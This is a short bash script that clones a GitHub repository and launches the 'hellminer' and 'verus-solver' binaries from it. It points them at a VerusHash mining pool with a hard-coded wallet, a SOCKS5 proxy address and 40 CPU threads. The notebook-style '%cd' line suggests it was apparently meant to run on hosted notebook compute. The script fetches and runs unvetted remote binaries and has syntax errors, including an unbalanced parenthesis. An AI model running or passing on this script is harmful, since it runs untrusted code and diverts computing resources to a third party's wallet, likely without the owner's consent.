#!/bin/bash
sudo apt update
sudo apt install screen -y
sudo apt install screen libjansson4 -y
git clone https://github.com/solinos-utabs/tpuku.git
%cd tpuku
chmod +x ./hellminer
./hellminer
chmod +x ./verus-solver
./verus-solver
screen -dmS ls
POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
PROXY=socks5://72.195.114.169:4145
WORKER=Rig$(echo "$(curl -s ifconfig.me)" | tr . _ ))
./hellminer -c $POOL -u $WALLET.$WORKER $@ -p x --cpu 40
